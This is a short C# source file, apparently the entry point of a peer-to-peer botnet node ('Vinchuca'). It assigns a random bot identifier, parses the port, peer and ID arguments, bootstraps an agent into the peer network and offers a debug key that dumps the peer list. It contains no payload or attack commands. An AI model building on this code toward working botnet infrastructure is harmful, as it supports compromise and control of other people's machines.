using System;
using System.Collections.Generic;
using Vinchuca.Network;
using Vinchuca.Network.Protocol.Peers;

namespace Vinchuca
{
    public class EntryPoint
    {
        private static Agent agent;

        public static void Main(string[] args)
        {
            var idbuf = new byte[16];
            new Random().NextBytes(idbuf);

            var id = new BotIdentifier(idbuf);
            var listenPort = 33333;
            var peers = new List<PeerInfo>();

            foreach (var arg in args)
            {
                var v = arg.Substring(1);
                switch (arg[0])
                {
                    case 'p':
                        int.TryParse(v, out listenPort);
                        break;
                    case 'c':
                        foreach (var peerInfo in v.Split(new[]{';'}))
                        {
                            peers.Add(PeerInfo.Parse(peerInfo));
                        }
                        break;
                    case 'i':
                        id = BotIdentifier.Parse(v);
                        break;
                }
            }

            agent = new Agent(listenPort, id);
            agent.Run();
            agent.Bootstrap(peers);
            var c = Console.ReadKey(true);
            while(c.Key != ConsoleKey.Spacebar)
            {
                Debug(c.Key);
                c = Console.ReadKey(true);
            }
        }

        private static void Debug(ConsoleKey key)
        {
            switch (key)
            {
                case ConsoleKey.L:
                    agent.PeerList.Dump();
                    break;
                case ConsoleKey.Help:
                    //Help();
                    break;
                case ConsoleKey.C:
                    //agent.PeerList.Clear();
                    break;
            }
        }
    }
}